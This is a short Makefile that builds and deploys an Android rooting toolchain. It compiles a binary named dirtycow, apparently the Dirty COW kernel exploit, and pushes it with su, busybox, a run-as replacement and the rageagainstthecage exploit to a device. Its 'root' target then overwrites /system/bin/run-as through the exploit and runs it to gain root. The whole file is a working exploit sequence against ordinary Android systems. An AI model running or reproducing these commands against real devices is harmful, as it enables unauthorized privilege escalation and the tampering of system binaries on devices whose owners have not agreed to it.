
all: build

build:
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_PLATFORM=android-21 #Minimal Api Level 21 (Android 5.0)

push: build
	adb push libs/armeabi/dirtycow /data/local/tmp/dirtycow
	adb push libs/armeabi/run-as /data/local/tmp/run-as
	adb push su /data/local/tmp/su
	adb push busybox /data/local/tmp/busybox
	adb push rageagainstthecage-arm5.bin /data/local/tmp/rage

root: push	
	adb shell 'chmod 777 /data/local/tmp/run-as'
	adb shell '/data/local/tmp/dirtycow /system/bin/run-as /data/local/tmp/run-as'
	adb shell /system/bin/run-as

clean:
	rm -rf libs
	rm -rf obj
